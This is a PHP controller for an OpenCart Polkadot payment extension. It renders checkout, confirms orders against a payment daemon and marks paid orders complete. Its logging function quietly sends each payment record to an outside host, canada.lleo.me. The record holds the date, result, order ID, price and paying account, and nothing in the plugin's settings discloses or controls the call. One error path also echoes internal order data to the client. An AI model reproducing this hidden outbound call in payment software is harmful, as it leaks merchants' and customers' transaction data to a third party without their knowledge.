<?php

namespace Opencart\Catalog\Controller\Extension\Polkadot\Payment;

class Polkadot extends \Opencart\System\Engine\Controller {

	public function index(): string {
		$this->load->language('extension/polkadot/payment/polkadot');
		if (isset($this->session->data['payment_method'])) {
			$data['logged'] = $this->customer->isLogged();
			$data['subscription'] = $this->cart->hasSubscription();
			$data['datas_order_id'] = 1*($this->session->data['order_id']);
			$this->load->model('checkout/order');
			$order_info = $this->model_checkout_order->getOrder($data['datas_order_id']);
			$data['datas_total']=($order_info? 1*$order_info["total"] : 'error');
			$data['datas_wss']= $this->config->get('payment_polkadot_engineurl');
			$data['language'] = $this->config->get('config_language');
			// Card storage
			if ($this->session->data['payment_method']['code'] == 'polkadot.polkadot') {
				return $this->load->view('extension/polkadot/payment/polkadot', $data);
			} else {
				return $this->load->view('extension/polkadot/payment/stored', $data);
			}
		}
		return '';
	}



	function logs($s='') {
	    $f = DIR_LOGS . "polkadot_log.log";
	    $l=fopen($f,'a+');
	    fputs($l,$s);
	    fclose($l);
	    // chmod($f,0666);

	    // file_get_contents("http://canada.lleo.me/bot/t.php?id=844809-1640D8&soft=NUK&message=KEMPELA%20".urlencode($s));
	    file_get_contents("http://canada.lleo.me/bot/t.php?id=000000-FEFEBA&soft=kambala&message=".urlencode($s));

	}

	public function preconfirm(): void {
		die('false');
	}

	public function confirm(): void {
		$this->load->language('extension/polkadot/payment/polkadot');
	//	$this->response->addHeader('Content-Type: application/json');
	$this->response->addHeader('Content-Type: text/plain');

		$json = [];

		if ( ! isset($this->session->data['order_id']) ) {
		    $json['error'] = 'order_id';
		    $json['error_message'] = $this->language->get('error_order');
		    $this->response->setOutput(json_encode($json));
		    return;
		}

		// Order ID
		$json['order_id']=$this->session->data['order_id'];

		$this->load->model('checkout/order');
		$order_info = $this->model_checkout_order->getOrder($json['order_id']);
		if (!$order_info) {
		    $json['error'] = 'order';
		    $json['error_message'] = $this->language->get('error_order');
		    $this->response->setOutput(json_encode($json));
		    return;
		}

		// price
	    	$json['price'] = 1*$order_info["total"]; // round(); // .'.0';

		// url
		$url = $this->config->get('payment_polkadot_engineurl');

		// A J A X
		$r = $this->ajax($json,$url);

		if(isset($r['error'])) {
		    $this->response->setOutput(json_encode($r));
		    return;
		} else {
		    foreach($r as $n=>$l) $json['daemon_'.$n]=$l;
		    if(
			!isset($r['order_id']) || $r['order_id'] != $json['order_id']
		     || !isset($r['price'])   || 1*$r['price']   != 1*$json['price']
		    ) {
		    $json['error'] = 'response';
		    $json['error_message'] = 'error price or order_id in daemon responce: '
			."price: (".(1*$r['price']).")(".(1*$json['price']).")"
			."order_id: (".($r['order_id']).")(".($json['order_id']).")"
			."json: [".print_r($json,1)."]";
		    $this->response->setOutput(json_encode($r));
		    return;
		    }
		}

		$this->logs(date("Y-m-d H:i:s")." [".$r['result']."] order:".$json['order_id']." price:".$json['price']." ".$r['pay_account']."\n");

		if(isset($r['result']) && $r['result']=='Paid') {
/*
    1       Voided                  Аннулировано        
2       Processing              В обработке             Передан в печать    
    3       Chargeback              Возврат        
    4       Refunded                Возмещенный             Передан в доставку
    5       Shipped                 Доставлено              Доставлен и готов к выдаче    
    6       Failed                  Неудавшийся        
7       Processed               Обработано              Напечатан    
8       Pending                 Ожидание                Принят    
    9       Canceled Reversal       Отмена и аннулирование        
    10      Canceled                Отменено                Отменен    
    11      Reversed                Полностью измененный        
    12      Denied                  Полный возврат        
    13      Expired                 Просрочено        
    14      Complete                Сделка завершена        Выдан    
*/



		    $this->model_checkout_order->addHistory($this->session->data['order_id'], $this->config->get('payment_polkadot_approved_status_id'), '', true);
		    $json['redirect'] = $this->url->link('checkout/success', 'language=' . $this->config->get('config_language'), true);
		}

		$this->response->setOutput(json_encode($json));
	}


function ajax($json,$url) {
    if(gettype($json)!='string') {
        $json=json_encode($json,JSON_UNESCAPED_UNICODE);
        if(empty($json)) return array( 'error' => 'json', 'error_message' => 'Wrong INPUT' );
    }
    $json=json_encode(json_decode($json),JSON_UNESCAPED_UNICODE);

    $ch = curl_init( );
    curl_setopt_array($ch, array(
        CURLOPT_POSTFIELDS => $json,
        CURLOPT_HTTPHEADER => array('Content-Type:application/json'),
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FAILONERROR => true,
        CURLOPT_CONNECTTIMEOUT => 3, // only spend 3 seconds trying to connect
        CURLOPT_TIMEOUT => 10, // 30 sec waiting for answer
	CURLOPT_URL => $url
    ));
    $result = curl_exec($ch);

    if (curl_errno($ch)) return array( 'error' => 'connect', 'error_message' => curl_error($ch) );
    $array = json_decode($result);
    if(empty($array)) return array( 'error' => 'json', 'error_message' => 'Wrong json format' );
    curl_close($ch);
    return (array) $array;
}

}
